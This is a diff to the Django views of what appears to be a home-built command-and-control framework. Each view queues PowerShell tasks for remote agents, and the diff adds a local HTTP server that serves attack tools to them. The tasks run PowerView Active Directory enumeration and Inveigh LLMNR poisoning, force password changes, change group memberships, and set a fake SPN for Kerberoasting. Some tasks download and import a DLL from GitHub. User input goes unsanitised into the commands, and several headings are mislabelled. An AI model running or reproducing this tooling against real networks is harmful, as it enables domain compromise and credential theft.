@@ -3,6 +3,7 @@ from blog.views import *
 from blog.models import *
 
 current_path= os.path.dirname(os.path.abspath(__file__))
+tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/Tools&Scripts"
 
 
 #### we need to download modules & tools from ../general/ on the windows machine
@@ -34,6 +35,7 @@ def SPNUsersforKerb(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Accounts for Kerb===============";import-module $env:USERPROFILE\powerview.ps1;Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -230,6 +232,7 @@ def DomainControllers(request, domain=''):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Domain Controllers===============";import-module $env:USERPROFILE\powerview.ps1;get-domaincontroller -domain {};echo "++++++++++++++++++`r`n"'.format(domain)
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -307,6 +310,7 @@ def groupInfo(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         group = request.POST['group']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task = '(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;echo "++++++++++++++++++`r`n`t`r`n===============Get-ADGroup===============";Get-ADGroup -Identity "{group}";echo "===============Get-DomainGroupMember===============";Get-ADGroupMember -Identity "{group}";echo "++++++++++++++++++`r`n" '.format(group)
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -458,6 +462,7 @@ def TrustRelations(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============TrustRelationships===============";(New-Object Net.WebClient).DownloadFileAsync("https://raw.githubusercontent.com/samratashok/ADModule/master/Microsoft.ActiveDirectory.Management.dll", $env:USERPROFILE+"/Microsoft.ActiveDirectory.Management.dll");import-module $env:USERPROFILE\Microsoft.ActiveDirectory.Management.dll;Get-ADTrust -Filter *;echo "++++++++++++++++++`r`n"'
         
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -473,6 +478,7 @@ def TrustRelations(request):
 #powerview
 def TrustMap(request, agent=''):
     if request.method=='POST':
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Get-DomainTrustMapping===============";import-module $env:USERPROFILE\powerview.ps1;Get-DomainTrustMapping;;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -809,6 +815,7 @@ def TGStickets_powerview(request):
 #powerview    
 def test_localAdmin(request, agent='', compName='', user='', password='', domain=''):
     if request.method=='POST':
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         if user == '':
             task= 'echo "++++++++++++++++++`r`n`t`r`n===============Test-AdminAccess===============";import-module $env:USERPROFILE\powerview.ps1;Test-AdminAccess -ComputerName {};echo "++++++++++++++++++`r`n"'.format(compName)    
             task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -899,6 +906,7 @@ def CME_pass_spray(request):
 ####Need a look to the OutPut-Dir
 def llmnr_poison(request, agent='', time=0):
     if request.method=='POST':
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Inveigh starting===============";import-module $env:USERPROFILE\inveigh.ps1;Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -RunTime {};echo "++++++++++++++++++`r`n"'.format(time)
         #####then send the inveigh logs ($env:USERPROFILE\Inveigh-*) files to our machine
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
@@ -949,6 +957,7 @@ def InterestingACL_Enum(request):
         moduleId = request.POST['moduleId']
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Find-InterestingDomainAcl===============";import-module $env:userprofile\powerview.ps1;Find-InterestingDomainAcl;echo "++++++++++++++++++`r`n"'
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -969,6 +978,7 @@ def SpecificACL_Enum_powerview(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         user = request.POST['user']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============ACLs Enum===============";import-module $env:userprofile\powerview.ps1;$sid = Convert-NameToSid {user};Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid};echo "++++++++++++++++++`r`n"'.format(user)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -987,6 +997,7 @@ def ReverseSearch_and_Mapping_GUID(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         guid = request.POST['guid']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Reverse Search & Mapping to a GUID Value===============";import-module $env:userprofile\Microsoft.ActiveDirectory.Management.dll;$guid="{}";Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like \'ControlAccessRight\'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid}|fl;echo "++++++++++++++++++`r`n"'.format(guid)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -1006,6 +1017,7 @@ def NestedGroups_of_a_Group(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         groupname = request.POST['groupname']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============NestedGroups_of_a_Group===============";import-module $env:userprofile\powerview.ps1;Get-DomainGroup -Identity "{}" | select memberof;echo "++++++++++++++++++`r`n"'.format(groupname)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -1027,6 +1039,7 @@ def forceChangePass_DomainUserPassword(request):
         password = request.POST['password']
         wanteduser = request.POST['wanteduser']
         wantedpassword = request.POST['wantedpassword']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Force Change Password===============";import-module $env:userprofile\powerview.ps1;$firstPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{contoleduser}\',$firstPassword);$secondPassword =ConvertTo-SecureString \'{wantedpassword}\' -AsPlainText -Force;Set-DomainUserPassword -Identity {wanteduser} -AccountPassword $secondPassword -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,contoleduser,wantedpassword,wanteduser)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -1047,6 +1060,7 @@ def AddGroupMember(request):
         user = request.POST['user']
         password = request.POST['password']
         group = request.POST['group']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Add Member to Group===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Add-DomainGroupMember -Identity \'{group}\' -Members \'{user}\' -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user,group)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -1067,6 +1081,7 @@ def RmGroupMember(request):
         user = request.POST['user']
         password = request.POST['password']
         group = request.POST['group']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Remove Group Member===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Remove-DomainGroupMember -Identity "{group}" -Members "{user}" -Credential $Cred -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user,group)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -1086,6 +1101,7 @@ def CreateFake_SPN(request):
         agentTask.save()
         user = request.POST['user']
         password = request.POST['password']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;$secPassword =ConvertTo-SecureString \'{password}\' -AsPlainText -Force;$Cred =New-Object System.Management.Automation.PSCredential(\'INLANEFREIGHT\{user}\', $secPassword);Set-DomainObject -Credential $Cred -Identity {user} -SET @{serviceprincipalname="notahacker/LEGIT"} -Verbose;echo "++++++++++++++++++`r`n"'.format(password,user)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -1105,6 +1121,7 @@ def UserGeneralInfo(request):
         agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
         agentTask.save()
         user = request.POST['user']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
         task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;Get-DomainUser -Identity {user} ;echo "++++++++++++++++++`r`n"'.format(user)
         task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
         with open(task_path, "w") as f:
@@ -1116,3 +1133,27 @@ def UserGeneralInfo(request):
         return render(request, 'blog/listeners.html')
 
 
+#Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
+
+
+def Enum_GroupMembers_on_machine(request):
+    if request.method=='POST':
+        agent = request.POST['agent']
+        agentId = request.POST['agentId']
+        moduleId = request.POST['moduleId']
+        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
+        agentTask.save()
+        groupName = request.POST['groupName']
+        computerName = request.POST['computerName']
+        os.system("timeout 30 python3 -m http.server --directory {} 8888".format(tools_path))
+        task= 'echo "++++++++++++++++++`r`n`t`r`n===============Createing Fake SPN===============";import-module $env:userprofile\powerview.ps1;Get-NetLocalGroupMember -ComputerName {} -GroupName "{}";echo "++++++++++++++++++`r`n"'.format(computerName,groupName)
+        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
+        with open(task_path, "w") as f:
+            f.write(task)
+            f.close()
+        return JsonResponse({},status=200)
+
+    else:
+        return render(request, 'blog/listeners.html')
+
+        
